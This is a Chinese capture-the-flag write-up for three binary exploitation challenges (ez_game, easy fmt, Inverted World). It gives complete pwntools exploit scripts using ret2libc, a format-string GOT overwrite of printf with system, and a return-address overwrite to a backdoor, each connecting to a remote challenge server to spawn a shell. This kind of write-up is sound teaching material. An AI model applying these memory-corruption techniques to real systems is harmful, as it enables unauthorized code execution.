# PWN
## ez_game
这周最简单的一道题，一道简单的ret2libc
![[Pasted image 20241005215022.png]]
![[Pasted image 20241005215127.png]]
![[Pasted image 20241005215110.png]]
构造exp:
```python
from pwn import *
import pwnlib.gdb

context(arch='amd64', os='linux', log_level='debug')
local = False
if local:
    p = process('./attachment')
    pwnlib.gdb.attach(p, 'b *main')
else:
    p = remote('101.200.139.65', 30780)

elf = ELF('./attachment')
lib = ELF('./libc-2.31.so')

ret = 0x400509
rdi = 0x400783
rsp = 0x40077d

put_got = elf.got['puts']
put_plt = elf.plt['puts']
main = elf.symbols['func']

p.recvuntil(b"!!!!\n")

payload = b'A' * (0x50) + p64(ret) + p64(rdi) + p64(put_got) + p64(put_plt) + p64(main)
p.sendline(payload)

p.recvuntil(b'again!!\n')

addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print(hex(addr))

libc_base = addr - lib.sym['puts']
system = libc_base + lib.sym['system']
binsh = libc_base + next(lib.search('/bin/sh'))

p.recvuntil(b"!!!!\n")

payload = b'A' * (0x50 + 8) + p64(ret) + p64(rdi) + p64(binsh) + p64(system)
p.sendline(payload)

p.interactive()
```
运行后获取`shell`
![[Pasted image 20241005215455.png]]
PS:两个payload构造的时候涉及的栈堆平衡还不是很懂，这里属于试错试出来的

## easy fmt
首先第一次遇到给ld-linux的题目，查了一下需要patchelf后把libc版本弄对
![[Pasted image 20241005215657.png]]
主要函数这里可以看出可以利用格式化字符串漏洞，用gdb调试一下
![[Pasted image 20241005215834.png]]
可以看到`canary`(这道题没用)和`__libc_start_main+128`
思路很明显，第一次，利用格式化字符串漏洞泄露`__libc_start_main`的地址后可以获取基址，从而获取`system`函数的地址，同时获取`printf`函数的got表地址；第二次，利用格式化字符串漏洞将`printf`函数换为`system`函数；第三次，输入`/bin/sh`，使`printf`函数实际执行`system`获取shell
exp:
```python
from pwn import *
import pwnlib.gdb

context(arch='amd64', os='linux')
context.log_level = 'debug'
local = True
if local:
    p = process('./ez_fmt')
    pwnlib.gdb.attach(p, 'b vuln')
else:
    p = remote('39.106.48.123', 28643)

libc = ELF('./libc.so.6')
elf = ELF('./ez_fmt')

offset = 8
payload = '%39$p'
p.recvuntil(b'data: \n')
p.sendline(payload)
receive = p.recvuntil(b'\n')
main_addr = int(receive, 16) - 128
log.info("main_addr: " + hex(main_addr))

printf_got = elf.got['printf']

base = main_addr - libc.symbols['__libc_start_main']
system_addr = base + libc.symbols['system']
log.info("system_addr: " + hex(system_addr))
print("printf_got: ", hex(printf_got))

payload = fmtstr_payload(offset, {printf_got: system_addr}, write_size='int')
  
print("len_payload: ", len(payload))
print("fmtstr_payload: ", payload)

p.sendafter(b'data: \n', payload)

p.recvuntil(b'data: \n')
p.sendline(b'/bin/sh\x00')

p.interactive()
```
![[Pasted image 20241005220952.png]]
注意点：因为`read`有大小限制，在使用`fmtstr_payload`时需限制`write_size`参数为`int`来缩短`payload`，不过会导致需要填充的字符数量很多，要填充一会
~~是哪个傻子获取`printf`的got时写成`elf.sym`，导致做了好几天没做出来，我不好说~~
## Inverted World
![[Pasted image 20241005221232.png]]
首先可以看到有一个backdoor函数，没什么思路，打开gdb调试一下
![[Pasted image 20241005221439.png]]
可以发现整个是逆序放入栈中的，那么只需要填充至`+008`处将`+008`处换为`backdoor`的地址就可以调用`backdoor`了
![[Pasted image 20241005221833.png]]
进入``backdoor``后发现还需要`hackable`为真时才能真正获取`shell`，不然会获得一个真“flag”，这里我没找到直接改变`hackable`的方法，我选择直接进入`if`里面
![[Pasted image 20241005222024.png]]
将覆盖地址改为`0x401387c则可以直接进入`if`内
构造exp:
```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
local = False
if local:
    p = process('./inverted_world')
    pwnlib.gdb.attach(p, 'b *read')
else:
    p = remote('39.106.48.123', 34234)

# 因read为倒叙读取，所以需要将输入的字符串倒叙输入
backdoor = 0x7c13400000000000

payload = b'a' * (0x100) + p64(backdoor)
p.sendline(payload)
p.interactive()
```
![[Pasted image 20241005222343.png]]
然后我们又会发现，这里的`read`他在需要倒叙输入的同时，还只能输入两个字符，除了`ls`我们什么都干不了.......
才怪，输入`sh`可以直接获取`shell`
![[Pasted image 20241005222549.png]]
接下来可以正常获取flag